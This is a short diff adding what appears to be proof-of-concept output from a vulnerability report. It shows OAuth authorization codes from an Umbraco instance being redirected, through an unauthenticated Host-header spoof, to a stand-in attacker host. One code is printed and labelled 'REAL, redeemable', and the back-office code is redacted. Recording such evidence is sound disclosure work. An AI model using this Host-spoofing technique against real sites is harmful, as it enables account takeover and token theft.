@@ -1,0 +1,7 @@
+The auth code delivered to the attacker-controlled host after an unauthenticated Host spoof:
+
+swagger  Location: http://evil-77c658a95e.attacker.example/umbraco/openapi/oauth2-redirect.html?code=G2Zx67KmvxClvM304l7--7xGoXPX1vq7-HcCPUt5FmQ&state=fb82138575b3&iss=http%3A%2F%2Flocalhost%3A29184%2F
+swagger  code (REAL, redeemable): G2Zx67KmvxClvM304l7--7xGoXPX1vq7-HcCPUt5FmQ
+
+back-office Location: http://evil-77c658a95e.attacker.example/umbraco/oauth_complete?code=%5Bredacted%5D&state=42067aa2691a&iss=http%3A%2F%2Flocalhost%3A29184%2F
+back-office code: [redacted]  (redacted for the back-office client; the redirect itself is the open-redirect)
